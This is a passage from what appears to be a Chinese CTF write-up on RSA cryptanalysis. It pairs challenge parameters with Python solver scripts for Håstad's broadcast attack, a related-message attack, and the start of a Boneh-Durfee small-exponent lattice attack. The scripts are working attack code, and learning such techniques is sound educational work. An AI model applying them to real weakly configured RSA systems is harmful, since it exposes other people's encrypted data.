punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>n1<span class="token operator">=</span>0x5797fdb74bcea6788212fb2c32c5d98d308c617f893d1f375d0e611b424d5656df4465772e278c25e7d1d5fd73b0fdfdac4a786a11403d239a2f84dc77a46c1108219eed98567605ab29ffdeef10594863bb49d45d41c1f3925d6a33bb34205321ab03d906e2d89c2153e76f2ad185bac9fb26099910dd19cf3be35ec7e01df5Lc1<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token operator">=</span>0x25e206422ea328f1b295dd121970b874b002789b2419a57584b2f1a682a36312a45efe22bb68694b9c9dfdc63c4f10b746a4a2893b29f918d90cb5129d52e66babf7f8516c44cd33ee27d2cf2968e0002ab2b711387d8f111315bd23d3f92073634ed6e57fa9b56d14104f75336f46c6dd43fbac810a6337a7ad3f60890873bLn2<span class="token operator">=</span>0x50998a3cf7f86a3044fe3c1fda2f6df7050383833279ebdbfe943f83faae3ada1bb6e684e48efd0487056849d47552d8052144364a72324b038ea73812960015c678c4e903e25515d874d1435761f20d1d6a066d2b70651c051dc157d2183d91ed6e7ae25d4adb0ce04833b816f96c5fd718c687474cacca6ad1dcc85db07e89Lc2<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token operator">=</span>0x448f88bec6795e11b06a7810faf617931bc6d99d1628cafecff1e933154ce575caaf752c3daf50b288ad7759ea8133f7dc9ca42a1b950eb8d538f98e00a4f3ad6bb0d6a9ad5d042d6db710c060bb72aa13065986d8dfb800409c08e4cdee471bc7ef31a6e3e2027ecb8ea9fb9b19440c5272fecf04aefdf2dbeafd994589c09fLn3<span class="token operator">=</span>0x15ed9002077c66e48a6fc80ce744f16b87e237ddd9a4efb4ffa2f9f89d09af382dddfc259dbf932728c23757957638f3ec9327fc0eaf3fd5d72b91c714798ca1459dfdf6c7505eb6e39f26624431239b6daa7bbaa6c5aad3dc3bf6b377923781ab5c221c195115d39c477c0561d5c769c17583c5b66d5f21f6683cea2670215bLc3<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n3<span class="token punctuation">)</span><span class="token operator">=</span>0xc9ddbb9478d0b64086091aac64efd51eb37b5067feb380995d39a917c0c927b26902f06dc449b53d80cd59c5d912fb5a5f45b223278919ae1ce449f4db7afbc252f16247129ea68dc6011093da6b11356591a9e8c0e10057e9d733712a6e0caafc462e9b2d07fb2aa3a451403a7f84de3504a60e72872df20bc244a0f1c837bLlong_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>???<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token punctuation">,</span>unpack<span class="token keyword">import</span> zlib<span class="token keyword">import</span> gmpy <span class="token keyword">def</span> <span class="token function">my_parse_number</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    string <span class="token operator">=</span> <span class="token string">"%x"</span> <span class="token operator">%</span> number    erg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> string <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>        erg <span class="token operator">=</span> erg <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>string<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        string <span class="token operator">=</span> string<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>erg<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">extended_gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">,</span>y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>    lastx<span class="token punctuation">,</span> lasty <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">while</span> b<span class="token punctuation">:</span>        a<span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span> b<span class="token punctuation">,</span> <span class="token builtin">divmod</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>        x<span class="token punctuation">,</span> lastx <span class="token operator">=</span> lastx<span class="token operator">-</span>q<span class="token operator">*</span>x<span class="token punctuation">,</span> x        y<span class="token punctuation">,</span> lasty <span class="token operator">=</span> lasty<span class="token operator">-</span>q<span class="token operator">*</span>y<span class="token punctuation">,</span> y    <span class="token keyword">return</span> <span class="token punctuation">(</span>lastx<span class="token punctuation">,</span> lasty<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chinese_remainder_theorem</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>  N <span class="token operator">=</span> <span class="token number">1</span>  <span class="token keyword">for</span> a<span class="token punctuation">,</span> n <span class="token keyword">in</span> items<span class="token punctuation">:</span>    N <span class="token operator">*=</span> n  result <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">for</span> a<span class="token punctuation">,</span> n <span class="token keyword">in</span> items<span class="token punctuation">:</span>    m <span class="token operator">=</span> N<span class="token operator">//</span>n    r<span class="token punctuation">,</span> s<span class="token punctuation">,</span> d <span class="token operator">=</span> extended_gcd<span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">)</span>    <span class="token keyword">if</span> d <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>      N<span class="token operator">=</span>N<span class="token operator">/</span>n      <span class="token keyword">continue</span>    result <span class="token operator">+=</span> a<span class="token operator">*</span>s<span class="token operator">*</span>m  <span class="token keyword">return</span> result <span class="token operator">%</span> N<span class="token punctuation">,</span> Nsessions<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"c"</span><span class="token punctuation">:</span> <span class="token number">0x25e206422ea328f1b295dd121970b874b002789b2419a57584b2f1a682a36312a45efe22bb68694b9c9dfdc63c4f10b746a4a2893b29f918d90cb5129d52e66babf7f8516c44cd33ee27d2cf2968e0002ab2b711387d8f111315bd23d3f92073634ed6e57fa9b56d14104f75336f46c6dd43fbac810a6337a7ad3f60890873b</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">:</span><span class="token number">0x5797fdb74bcea6788212fb2c32c5d98d308c617f893d1f375d0e611b424d5656df4465772e278c25e7d1d5fd73b0fdfdac4a786a11403d239a2f84dc77a46c1108219eed98567605ab29ffdeef10594863bb49d45d41c1f3925d6a33bb34205321ab03d906e2d89c2153e76f2ad185bac9fb26099910dd19cf3be35ec7e01df5</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"c"</span><span class="token punctuation">:</span><span class="token number">0x448f88bec6795e11b06a7810faf617931bc6d99d1628cafecff1e933154ce575caaf752c3daf50b288ad7759ea8133f7dc9ca42a1b950eb8d538f98e00a4f3ad6bb0d6a9ad5d042d6db710c060bb72aa13065986d8dfb800409c08e4cdee471bc7ef31a6e3e2027ecb8ea9fb9b19440c5272fecf04aefdf2dbeafd994589c09f</span> <span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">:</span><span class="token number">0x50998a3cf7f86a3044fe3c1fda2f6df7050383833279ebdbfe943f83faae3ada1bb6e684e48efd0487056849d47552d8052144364a72324b038ea73812960015c678c4e903e25515d874d1435761f20d1d6a066d2b70651c051dc157d2183d91ed6e7ae25d4adb0ce04833b816f96c5fd718c687474cacca6ad1dcc85db07e89</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"c"</span><span class="token punctuation">:</span><span class="token number">0xc9ddbb9478d0b64086091aac64efd51eb37b5067feb380995d39a917c0c927b26902f06dc449b53d80cd59c5d912fb5a5f45b223278919ae1ce449f4db7afbc252f16247129ea68dc6011093da6b11356591a9e8c0e10057e9d733712a6e0caafc462e9b2d07fb2aa3a451403a7f84de3504a60e72872df20bc244a0f1c837b</span> <span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">:</span><span class="token number">0x15ed9002077c66e48a6fc80ce744f16b87e237ddd9a4efb4ffa2f9f89d09af382dddfc259dbf932728c23757957638f3ec9327fc0eaf3fd5d72b91c714798ca1459dfdf6c7505eb6e39f26624431239b6daa7bbaa6c5aad3dc3bf6b377923781ab5c221c195115d39c477c0561d5c769c17583c5b66d5f21f6683cea2670215b</span> <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> session <span class="token keyword">in</span> sessions<span class="token punctuation">:</span>    e<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'e'</span><span class="token punctuation">]</span>    n<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span>    msg<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> data <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Please wait, performing CRT"</span><span class="token punctuation">)</span>x<span class="token punctuation">,</span> n <span class="token operator">=</span> chinese_remainder_theorem<span class="token punctuation">(</span>data<span class="token punctuation">)</span>e<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'e'</span><span class="token punctuation">]</span>realnum <span class="token operator">=</span> gmpy<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>root<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>digits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>my_parse_number<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>realnum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、明文c存在线性关系，Related-Message-Attack-和-RSA-Padding-Attack"><a href="#5、明文c存在线性关系，Related-Message-Attack-和-RSA-Padding-Attack" class="headerlink" title="5、明文c存在线性关系，Related Message Attack 和 RSA Padding Attack"></a>5、明文c存在线性关系，Related Message Attack 和 RSA Padding Attack</h3><h4 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">n<span class="token operator">=</span>0xf9526aad4d41c9b28f8bae279c7ef6b07d729d1f56e530219851f656ad521218815bdccb15167a25633a2f76969fccd3fe1ef379ded08d1a9c3307f680e952956d2b3d04cc50040efb30e40bf2562aae4b05b8ec0d5e0e0ea5fdc1b00b80dee9b6de1d77d41d8d040d3465c89133d9af23b1d43f57e70606e3433d35a47e2edLe<span class="token operator">=</span><span class="token number">3</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x798841c574b7c88ce1430d4b02bac01fc9368c71a7966176b22f9dc2e0c2f6d4d5b8a9e10dbcaa4584e667ef1afd213b78c2bdc16ba5ab909c2de2fe5a7a5fa36a390bdccf794451cd9db8489ed7870efa4a4d7d1cacacfec92e81f6bb955a4ef5d71d80631c0726d22ec3d5b115de7ff42f22e67854b59ed816e06485ab523Lx<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xe92c4c99052fa3c4bb5e54477b0afe8e18da37255269f070ffa6824492a87153e428fa4ed839b7f3249966259a0c88641185594fc2fa4881cf32b7af5b18baa6f5200453ee80e38c74dbeb90f32118e4f33e636a808e44f27e09286d109ee8f41765ad64c7afea9775974d78a80e0977a37689c7f15a23a83a87b1f5bdbcdecLlong_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>???<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="python脚本-1"><a href="#python脚本-1" class="headerlink" title="python脚本"></a>python脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> functools<span class="token keyword">def</span> <span class="token function">getM2</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    a3 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>    b3 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>    first <span class="token operator">=</span> c1<span class="token operator">-</span>a3<span class="token operator">*</span>c2<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>b3    first <span class="token operator">=</span> first <span class="token operator">%</span> n    second <span class="token operator">=</span> <span class="token number">3</span><span class="token operator">*</span>b<span class="token operator">*</span><span class="token punctuation">(</span>a3<span class="token operator">*</span>c2<span class="token operator">-</span>b3<span class="token punctuation">)</span>    second <span class="token operator">=</span> second <span class="token operator">%</span> n    third <span class="token operator">=</span> second<span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>first<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    third <span class="token operator">=</span> third <span class="token operator">%</span> n    fourth <span class="token operator">=</span> <span class="token punctuation">(</span>third<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">return</span> fourth <span class="token operator">%</span> na<span class="token operator">=</span><span class="token number">1</span>b<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>padding2<span class="token operator">=</span>bn<span class="token operator">=</span><span class="token number">0xf9526aad4d41c9b28f8bae279c7ef6b07d729d1f56e530219851f656ad521218815bdccb15167a25633a2f76969fccd3fe1ef379ded08d1a9c3307f680e952956d2b3d04cc50040efb30e40bf2562aae4b05b8ec0d5e0e0ea5fdc1b00b80dee9b6de1d77d41d8d040d3465c89133d9af23b1d43f57e70606e3433d35a47e2ed</span>c1<span class="token operator">=</span><span class="token number">0x798841c574b7c88ce1430d4b02bac01fc9368c71a7966176b22f9dc2e0c2f6d4d5b8a9e10dbcaa4584e667ef1afd213b78c2bdc16ba5ab909c2de2fe5a7a5fa36a390bdccf794451cd9db8489ed7870efa4a4d7d1cacacfec92e81f6bb955a4ef5d71d80631c0726d22ec3d5b115de7ff42f22e67854b59ed816e06485ab523</span>c2<span class="token operator">=</span><span class="token number">0xe92c4c99052fa3c4bb5e54477b0afe8e18da37255269f070ffa6824492a87153e428fa4ed839b7f3249966259a0c88641185594fc2fa4881cf32b7af5b18baa6f5200453ee80e38c74dbeb90f32118e4f33e636a808e44f27e09286d109ee8f41765ad64c7afea9775974d78a80e0977a37689c7f15a23a83a87b1f5bdbcdec</span>m <span class="token operator">=</span> getM2<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">-</span>padding2<span class="token keyword">print</span> <span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6、私钥d-较小时，满足-d-lt-N-0-292，Boneh-and-Durfee-attack"><a href="#6、私钥d-较小时，满足-d-lt-N-0-292，Boneh-and-Durfee-attack" class="headerlink" title="6、私钥d 较小时，满足 d&lt;N^0.292，Boneh and Durfee attack"></a>6、私钥d 较小时，满足 d&lt;N^0.292，Boneh and Durfee attack</h3><h4 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">6</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">0.270</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span>invmod<span class="token punctuation">(</span>d<span class="token punctuation">,</span>phin<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token builtin">hex</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">=</span>0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="python脚本-2"><a href="#python脚本-2" class="headerlink" title="python脚本"></a>python脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time <span class="token comment">############################################</span><span class="token comment"># Config</span><span class="token comment">##########################################</span> <span class="token triple-quoted-string string">"""Setting debug to true will display more informationsabout the lattice, the bounds, the vectors..."""</span>debug <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token triple-quoted-string string">"""Setting strict to true will stop the algorithm (andreturn (-1, -1)) if we don't have a correctupperbound on the determinant. Note that thisdoesn't necesseraly mean that no solutionswill be found since the theoretical upperbound isusualy far away from actual results. That is whyyou should probably use `strict = False`"""</span>strict <span class="token operator">=</span> <span class="token boolean">False</span> <span class="token triple-quoted-string string">"""This is experimental, but has provided remarkable resultsso far. It tries to reduce the lattice as much as it canwhile keeping its efficiency. I see no reason not to usethis option, but if things don't work, you should trydisabling it"""</span>helpful_only <span class="token operator">=</span> <span class="token boolean">True</span>dimension_min <span class="token operator">=</span> <span class="token number">7</span> <span class="token comment"># stop removing if lattice reaches that dimension</span> <span class="token comment">############################################</span><span class="token comment"># Functions</span><span class="token comment">##########################################</span> <span class="token comment"># display stats on helpful vectors</span><span class="token keyword">def</span> <span class="token function">helpful_vectors</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span><span class="token punctuation">:</span>    nothelpful <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>ii<span class="token punctuation">]</span> <span class="token operator">>=</span> modulus<span class="token punctuation">:</span>            nothelpful <span class="token operator">+=</span> <span class="token number">1</span>     <span class="token keyword">print</span> nothelpful<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">" vectors are not helpful"</span> <span class="token comment"># display matrix picture with 0 and X</span><span class="token keyword">def</span> <span class="token function">matrix_overview</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> bound<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%02d '</span> <span class="token operator">%</span> ii<span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'X'</span>            <span class="token keyword">if</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>                a <span class="token operator">+=</span> <span class="token string">' '</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'~'</span>        <span class="token keyword">print</span> a <span class="token comment"># tries to remove unhelpful vectors</span><span class="token comment"># we start at current = n-1 (last vector)</span><span class="token keyword">def</span> <span class="token function">remove_unhelpful</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># end of our recursive function</span>    <span class="token keyword">if</span> current <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> dimension_min<span class="token punctuation">:</span>        <span class="token keyword">return</span> BB     <span class="token comment"># we start by checking from the end</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>current<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># if it is unhelpful:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            affected_vectors <span class="token operator">=</span> <span class="token number">0</span>            affected_vector_index <span class="token operator">=</span> <span class="token number">0</span>            <span class="token comment"># let's check if it affects other vectors</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment"># if another vector is affected:</span>                <span class="token comment"># we increase the count</span>                <span class="token keyword">if</span> BB<span class="token punctuation">[</span>jj<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                    affected_vectors <span class="token operator">+=</span> <span class="token number">1</span>                    affected_vector_index <span class="token operator">=</span> jj             <span class="token comment"># level:0</span>            <span class="token comment"># if no other vectors end up affected</span>            <span class="token comment"># we remove it</span>            <span class="token keyword">if</span> affected_vectors <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vector"</span><span class="token punctuation">,</span> ii                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> BB             <span class="token comment"># level:1</span>            <span class="token comment"># if just one was affected we check</span>            <span class="token comment"># if it is affecting someone else</span>            <span class="token keyword">elif</span> affected_vectors <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                affected_deeper <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">for</span> kk <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>affected_vector_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span 